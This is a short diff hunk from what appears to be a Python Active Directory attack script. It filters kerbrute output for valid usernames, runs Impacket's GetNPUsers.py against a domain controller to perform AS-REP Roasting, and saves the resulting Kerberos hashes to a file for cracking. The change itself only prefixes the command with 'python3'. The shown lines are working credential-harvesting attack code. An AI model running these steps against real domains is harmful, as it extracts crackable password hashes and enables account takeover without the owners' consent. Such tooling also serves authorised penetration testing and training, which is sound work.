@@ -316,7 +316,7 @@ print("")
 printf(' AS-REP Roasting valid users',green)
 os.system('cat kerbrutelog.txt | grep VALID | cut -f2 | cut -d "@" -f1 | cut -d " " -f2 > valid_users.txt')
 os.system("rm kerbrutelog.txt")
-os.system(f'{path_impacket}/GetNPUsers.py -no-pass -usersfile valid_users.txt -dc-ip {ip_to_scan} {Domain_Name}/ > GetNPUsers.log' )
+os.system(f'python3 {path_impacket}/GetNPUsers.py -no-pass -usersfile valid_users.txt -dc-ip {ip_to_scan} {Domain_Name}/ > GetNPUsers.log' )
 os.system('cat GetNPUsers.log | grep krb5 > kerberhashs.txt')
 os.system("rm GetNPUsers.log")
 with open('kerberhashs.txt', 'r') as fichier:
